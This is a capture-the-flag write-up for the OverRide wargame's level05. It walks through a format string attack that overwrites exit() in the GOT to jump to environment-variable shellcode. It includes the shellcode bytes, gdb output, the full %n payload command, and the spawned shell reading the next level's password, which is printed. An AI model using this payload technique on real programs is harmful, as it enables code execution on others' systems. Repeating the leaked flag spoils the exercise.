The program is quite simple. It records the user's input in a buffer with a call to fgets(). Then it makes a kind of tolower() for each uppercase alphabetic character in the buffer. Finally, the content of the buffer is displayed with a badly formatted printf() before the program exits using `exit(0)`. We will be able to perform a format string attack thanks to the badly formatted printf(). We will have to use a shellcode, and for its execution, we should be able to overwrite the address of exit() in the Global Offset Table (GOT).

1. First, let's export a shellcode in an environment variable and find its address using [this little script](env_addr.c):
```
level05@OverRide:~$ export SHELLCODE=$(python -c 'print "\x90" * 79 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
level05@OverRide:/tmp$ gcc -m32 env_addr.c -o env_addr
level05@OverRide:/tmp$ ./env_addr SHELLCODE
0xffffd88a
```

2. Let's now get the address of exit() in the Global Offset Table using gdb:
```
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```
So we now have the address we want to ovewrite: 0x80497e0.

3. Now, let's find the offset of the buffer:
```
level05@OverRide:~$ ./level05 
aaaa %x %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 f7ec3af9 ffffd6cf ffffd6ce 0 ffffffff ffffd754 f7fdb000 61616161 20782520
```
Here we have the begining of the buffer (61616161 = "aaaa") with an offset of 10.

4. We can now build our payload. The first thing we want to write in the buffer is the address we want to overwrite, that is the exit() address int the GOT. Now that the buffer contains an address, it behaves like a pointer and we will be able to write to this address with the `%n` modifier: by specifying the buffer offset (`$10`), we can write in whatever the buffer points to.

But what do we want to write? The address of our shellcode of course. The difficulty here is that the `%n` modifier has a particular behaviour: it writes the number of characters that come before the occurrence of the modifier. We will have to write the number of characters corresponding to the decimal value of the address of our shellcode (0xffffd88a = 4294957194). Obviously, so many characters will never fit in the buffer, so we will use a modifier with a width field.

Here we encounter another difficulty: the decimal value of the shellcode address is too large to be stored on 32 bits. We will therefore split the address and write it on 8 bytes. Since we want to register the address in the little endian convention, we have to first give the two last bytes of the address. For each part, we need to get the decimal value and substract from it the number of characters that have already been printed:
* 0xd88a = 55434, 55434 - 8 = 55426
* 0xffff = 65535, 65535 - 55434 = 10101

```
level05@OverRide:~$ python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55426d%10$n" + "%10101d%11$n"' > /tmp/exp
level05@OverRide:~$ cat /tmp/exp - | ./level05
...
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
We can now reach the next level with the command `su level06` and fill in the flag found as a password.